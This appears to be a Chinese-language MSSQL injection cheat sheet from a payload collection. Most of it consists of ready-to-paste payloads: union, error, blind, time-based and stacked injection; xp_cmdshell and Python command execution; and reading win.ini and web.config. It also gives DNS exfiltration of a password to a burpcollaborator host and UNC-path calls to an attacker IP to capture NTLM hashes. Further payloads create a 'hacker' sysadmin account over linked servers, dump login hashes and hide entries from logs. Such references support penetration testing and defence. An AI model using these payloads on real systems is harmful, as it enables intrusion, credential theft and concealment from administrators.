# MSSQL 注入

> MSSQL 注入是一种安全漏洞类型，当攻击者能够插入或“注入”恶意的 SQL 代码到由 Microsoft SQL Server（MSSQL）数据库执行的查询中时，就会发生这种情况。这通常发生在用户输入未经适当清理或参数化直接包含在 SQL 查询中时。SQL 注入可能导致严重后果，例如未经授权的数据访问、数据操纵，甚至获取对数据库服务器的控制权。

## 概述

* [MSSQL 默认数据库](#mssql-默认数据库)
* [MSSQL 注释](#mssql-注释)
* [MSSQL 枚举](#mssql-枚举)
    * [MSSQL 列出数据库](#mssql-列出数据库)
    * [MSSQL 列出表](#mssql-列出表)
    * [MSSQL 列出列](#mssql-列出列)
* [MSSQL 联合基于](#mssql-联合基于)
* [MSSQL 错误基于](#mssql-错误基于)
* [MSSQL 盲注基于](#mssql-盲注基于)
    * [MSSQL 使用子字符串等效的盲注](#mssql-使用子字符串等效的盲注)
* [MSSQL 时间基于](#mssql-时间基于)
* [MSSQL 堆叠查询](#mssql-堆叠查询)
* [MSSQL 文件操作](#mssql-文件操作)
    * [MSSQL 读取文件](#mssql-读取文件)
    * [MSSQL 写入文件](#mssql-写入文件)
* [MSSQL 命令执行](#mssql-命令执行)
    * [XP_CMDSHELL](#xp_cmdshell)
    * [Python 脚本](#python脚本)
* [MSSQL 外部通道](#mssql-外部通道)
    * [MSSQL DNS 数据外泄](#mssql-dns数据外泄)
    * [MSSQL UNC 路径](#mssql-unc路径)
* [MSSQL 可信链接](#mssql-可信链接)
* [MSSQL 权限](#mssql-权限)
    * [MSSQL 列出权限](#mssql-列出权限)
    * [MSSQL 将用户提升为DBA](#mssql-将用户提升为dba)
* [MSSQL 数据库凭据](#mssql-数据库凭据)
* [MSSQL OPSEC](#mssql-opsec)
* [参考文献](#参考文献)

## MSSQL 默认数据库

| 名称                  | 描述                           |
|-----------------------|--------------------------------|
| pubs                 | 在 MSSQL 2005 中不可用          |
| model                 | 所有版本都可用                 |
| msdb                 | 所有版本都可用                 |
| tempdb             | 所有版本都可用                 |
| northwind             | 所有版本都可用                 |
| information_schema | 从 MSSQL 2000 及更高版本可用   |

## MSSQL 注释

| 类型                       | 描述                       |
|----------------------------|-----------------------------|
| `/* MSSQL 注释 */`      | C 风格注释                 |
| `--`                       | SQL 注释                   |
| `;%00`                     | 空字节                     |

## MSSQL 枚举

| 描述       | SQL 查询                                      |
|------------|-------------------------------------------------|
| 数据库版本 | `SELECT @@version`                              |
| 数据库名称 | `SELECT DB_NAME()`                              |
| 数据库模式 | `SELECT SCHEMA_NAME()`                          |
| 主机名     | `SELECT HOST_NAME()`                            |
| 主机名     | `SELECT @@hostname`                             |
| 主机名     | `SELECT @@SERVERNAME`                           |
| 主机名     | `SELECT SERVERPROPERTY('productversion')`       |
| 主机名     | `SELECT SERVERPROPERTY('productlevel')`         |
| 主机名     | `SELECT SERVERPROPERTY('edition')`              |
| 用户       | `SELECT CURRENT_USER`                           |
| 用户       | `SELECT user_name();`                           |
| 用户       | `SELECT system_user;`                           |
| 用户       | `SELECT user;`                                  |

### MSSQL 列出数据库

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- 对于 N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- 更改分隔符值，例如将 ', ' 替换为你想要的任何其他值 => master, tempdb, model, msdb 
-- （仅在 MSSQL 2017+ 中有效）
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
```

### MSSQL 列出表

```sql
-- 使用 xtype = 'V' 列出视图
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- 列出 master..sometable 的列名和类型
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- 更改分隔符值，例如将 ', ' 替换为你想要的任何其他值 => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  （仅在 MSSQL 2017+ 中有效）
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
```

### MSSQL 列出列

```sql
-- 仅当前数据库
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- 列出 master..sometable 的列名和类型
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
```

## MSSQL 联合基于

* 提取数据库名称

    ```sql
    $ SELECT name FROM master..sysdatabases
    [*] 注入
    [*] msdb
    [*] tempdb
    ```

* 从 Injection 数据库提取表

    ```sql
    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
    [*] Profiles
    [*] Roles
    [*] Users
    ```

* 提取 Users 表的列

    ```sql
    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
    [*] UserId
    [*] UserName
    ```

* 最后提取数据

    ```sql
    SELECT  UserId, UserName from Users
    ```

## MSSQL 错误基于

| 名称         | 负载         |
|--------------|--------------|
| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |
| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |
| CAST         | `CAST((SELECT @@version) AS INT)` |

* 对于整数输入

    ```sql
    convert(int,@@version)
    cast((SELECT @@version) as int)
    ```

* 对于字符串输入

    ```sql
    ' + convert(int,@@version) + '
    ' + cast((SELECT @@version) as int) + '
    ```

## MSSQL 盲注基于

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
```

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

### MSSQL 盲注与子字符串等效

| 函数    | 示例                                         |
|-----------|-----------------------------------------------|
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |

示例：

```sql
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```

## MSSQL 时间基于

在时间基于的盲 SQL 注入攻击中，攻击者注入一个使用 `WAITFOR DELAY` 的负载，使数据库暂停一段时间。然后攻击者观察响应时间来推断注入的负载是否成功执行。

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
```

```sql
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

## MSSQL 堆叠查询

* 不带任何语句终止符的堆叠查询

    ```sql
    -- 多个 SELECT 语句
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- 使用堆叠查询更新密码
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- 使用堆叠查询启用 xp_cmdshell
    -- 你不会看到查询的输出，将其重定向到文件
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ```

* 使用分号 "`;`" 添加另一个查询

    ```sql
    ProductID=1; DROP members--
    ```

## MSSQL 文件操作

### MSSQL 读取文件

**权限要求**：`BULK` 选项需要 `ADMINISTER BULK OPERATIONS` 或 `ADMINISTER DATABASE BULK OPERATIONS` 权限。

```sql
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
```

示例：

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

### MSSQL 写入文件

```sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```

## MSSQL 命令执行

### XP_CMDSHELL

`xp_cmdshell` 是 Microsoft SQL Server 中的一个系统存储过程，允许你直接从 T-SQL（Transact-SQL）中运行操作系统命令。

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

如果需要重新激活 `xp_cmdshell`，它在 SQL Server 2005 中默认是禁用的。

```sql
-- 启用高级选项
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

### Python 脚本

> 由使用 `xp_cmdshell` 执行命令的不同用户执行

```powershell
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
```

## MSSQL 外部通道

### MSSQL DNS 数据外泄

技术来源：[@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)

* **权限要求**：需要服务器上的 `VIEW SERVER STATE` 权限。

    ```powershell
    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
    ```

* **权限要求**：需要 `CONTROL SERVER` 权限。

    ```powershell
    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
    ```

### MSSQL UNC 路径

MSSQL 支持堆叠查询，因此我们可以创建一个指向我们 IP 地址的变量，然后使用 `xp_dirtree` 函数列出我们的 SMB 共享中的文件并抓取 NTLMv2 哈希。

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

```sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
RESTORE LABELONLY FROM DISK = '\\attackerip\file'
RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
```

## MSSQL 可信链接

> 数据库之间的链接即使跨森林信任也仍然有效。

```powershell
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] # 如果你想滥用特权以获得 Meterpreter 会话，请将 DEPLOY 设置为 true
```

手动利用

```sql
-- 查找链接
select * from master..sysservers

-- 通过链接执行查询
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- 链接多个 openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- 执行 shell 命令
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- 创建用户并赋予管理员权限
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## MSSQL 权限

### MSSQL 列出权限

* 列出当前用户在服务器上的有效权限。

    ```sql
    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
    ```

* 列出当前用户在数据库上的有效权限。

    ```sql
    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
    ```

* 列出当前用户在某个视图上的有效权限。

    ```sql
    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
    ```

* 检查当前用户是否是指定服务器角色的成员。

    ```sql
    -- 可能的角色：sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
    SELECT is_srvrolemember('sysadmin');
    ```

### MSSQL 将用户提升为DBA

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## MSSQL 数据库凭据

* **MSSQL 2000**: Hashcat 模式 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`

    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- 需要转换为十六进制才能在 MSSQL 错误消息中返回哈希 / 某些版本的查询分析器
    ```

* **MSSQL 2005**: Hashcat 模式 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`

    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```

## MSSQL OPSEC

在查询中使用 `SP_PASSWORD` 来隐藏日志中的记录，例如：`' AND 1=1--sp_password`

```sql
-- 'sp_password' 在此事件的文本中被发现。
-- 为了安全起见，文本已被替换为此注释。
```

## 参考文献

* [由于非正统的 MSSQL 设计选择导致 AWS WAF 客户端易受 SQL 注入攻击 - Marc Olivier Bergeron - 2023 年 6 月 21 日](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
* [“Order By” 子句中的基于错误的 SQL 注入 - Manish Kishan Tanwar - 2018 年 3 月 26 日](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
* [完整的 MSSQL 注入 PWN - ZeQ3uL && JabAv0C - 2009 年 1 月 28 日](https://www.exploit-db.com/papers/12975)
* [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - 2024 年 4 月 9 日](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
* [MSSQL 注入速查表 - @pentestmonkey - 2011 年 8 月 30 日](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* [MSSQL 可信链接 - HackTricks - 2024 年 9 月 15 日](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
* [SQL Server - 链接...链接...链接...并 Shell: 如何在 SQL Server 中黑客数据库链接！ - Antti Rantasaari - 2013 年 6 月 6 日](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
* [sys.fn_my_permissions (Transact-SQL) - Microsoft - 2024 年 1 月 25 日](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)